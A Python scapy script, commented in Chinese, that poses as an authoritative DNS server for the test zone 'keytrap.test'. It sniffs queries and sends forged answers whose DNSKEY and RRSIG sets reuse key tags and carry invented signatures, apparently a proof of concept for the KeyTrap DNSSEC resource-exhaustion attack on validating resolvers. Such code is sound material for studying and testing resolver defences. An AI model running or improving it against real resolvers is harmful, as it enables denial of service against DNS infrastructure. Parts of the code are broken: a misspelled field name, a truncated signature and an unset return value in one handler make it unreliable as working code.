from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR, DNSRRRSIG, DNSRRDNSKEY
from scapy.layers.inet import IP, UDP
import time

# 配置DNS服务器的IP和端口
IFACE_LAN = "eth0"
PORT_OF_SERVER = "53"
DOMAIN_NAME = "keytrap.test"

# BPF过滤器
BPF_FILTER = "udp port " + PORT_OF_SERVER 

RRSIG={
    "keytrap.test.": "u3i18XgPPsVN7bQlmWvSqPx0wtzNgsmEGW8FQ21Qiot67v4/MjkY8H27la+5eJIjo+eYIo1FpuUa2wxZ0eHA8dWck7ek0KFH/oibMSzvDWPkVBMwLFpjiOiiJVN5sOtw",
    "ns1.keytrap.test.": "/iNOASO1o0PtfxvlLIkrq/hb+jJqhbJeAstiNmjj/Ck7jYvBg+0xUL/rAaN9+RpA/vqa7uxX8zaI2xutux1avqQvHYngyU9ETjJNu6G6sLCqLTOrDPhrjbiV1OyVWdu2",
    "ns2.keytrap.test.": "vX1F0V3g3q3wvzU2kz1q0q6a3"
}

def handle_A_query(pkt):
    qname = pkt[DNS].qd.qname.decode("utf-8")
    if(qname == "www.keytrap.test."):
        spf_dns = DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
                        ancount=2, an=[
                            DNSRR(rrname=qname, type=1, ttl=10, rdata="1.2.3.4"),
                            DNSRRRSIG(rrname=qname, keytag=6350, signersname="keytrap.test", signature=RRSIG["keytrap.test."]),
                        ],
                        nscount=1, ns=DNSRR(rrname="ns1", type=2, ttl=60, rdata="ns1.keytrap.test."),
                        arcount=2, ar=[
                            DNSRR(rrname="ns1.keytrap.test.", type=1, ttl=60, rdata="1.2.3.4"),
                            DNSRRRSIG(rrname="ns1.keytrap.test.", keytag=6350, signersname="keytrap.test", signature=RRSIG["keytrap.test."]),
                        ],
                        )
    return spf_dns

def handle_DNSKEY_query(pkt):
    qname = pkt[DNS].qd.qname.decode("utf-8")
    if(qname == "www.keytrap.test."):
        spf_dns = DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
                        ancount=4, an=[
                            DNSRRDNSKEY(rrname="keytrap.test.", algorithm=14, flags=257, publickkey="MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hlhZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zhtL4aGaOG+870yHwuY"),
                            DNSRRDNSKEY(rrname="keytrap.test.", algorithm=14, flags=256, publickkey="MjY4X0GT9jf00V9bZU7cMkceFGdUMgbeNK4afF6BB/VznyKXsZlTeX5IgrD/8BNWd1jMvvL5RlbBXbmy5022d34VqReK5IRA6WKxp9uzDBEpc6qoh2npdudDTsFMZKor"),
                            DNSRRRSIG(rrname="keytrap.test.", keytag=6350, typecovered=48, signersname="keytrap.test.", signature="RV1t5PrsLi9tSUYq9ZNtFoXT8cmJYVUzOsn7xYPItKC7ky7Kpqiykk6HJIcnU4yyMbY2eLVfdjUZFqu0dKl5yQnJvuVswc6ZvbWUtPc1ElbETHKve+MqGZagRPfwulLT"),
                            DNSRRRSIG(rrname="keytrap.test.", keytag=30130, typecovered=48, signersname="keytrap.test.", signature="n4xGxlkb2FsJ3/nSfPaznBYXM4lDbMXLcXvIuxMNoRwpkdoKgUDX1PcwxnPhVS8T8Pi9SFM7KdhEl6b0lj/wtZPJtEA1oncjoE5sC7atr66ncAIpt9XVkCufFpepA8P/"),
                        ],
                    )
    return spf_dns

# 构造DNS响应
def craft_dns_response(pkt):
    reply_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / UDP(sport=int(PORT_OF_SERVER), dport=pkt[UDP].sport)
    qtype = pkt[DNS].qd.qtype
    
    # 查询A记录
    if qtype == 1:
        reply_pkt /= handle_A_query(pkt)
    # 查询DNSKEY记录
    elif qtype == 48:
        reply_pkt /= handle_DNSKEY_query(pkt)

    return reply_pkt

# 处理DNS查询请求
def dns_response(pkt):
    try:
        if DNS in pkt and pkt[DNS].qr == 0:  # 只处理查询请求
            print("%s : fm %s:%d : %s A ?" % (
                time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), pkt[IP].src, pkt[UDP].sport,
                pkt[DNS].qd.qname.decode("utf-8")))

            print(pkt)

            # 构建DNS响应
            resp = craft_dns_response(pkt)

            send(resp, iface=IFACE_LAN)

            print("%s : to %s:%d : %s A %s" % (
                time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), pkt[IP].src, pkt[UDP].sport,
                pkt[DNS].qd.qname.decode("utf-8"), "1.2.3.4"))

    except Exception as error:
        print("Error: ", error)

print("Start DNS Authority ...")
sniff(filter=BPF_FILTER, prn=dns_response, iface=IFACE_LAN)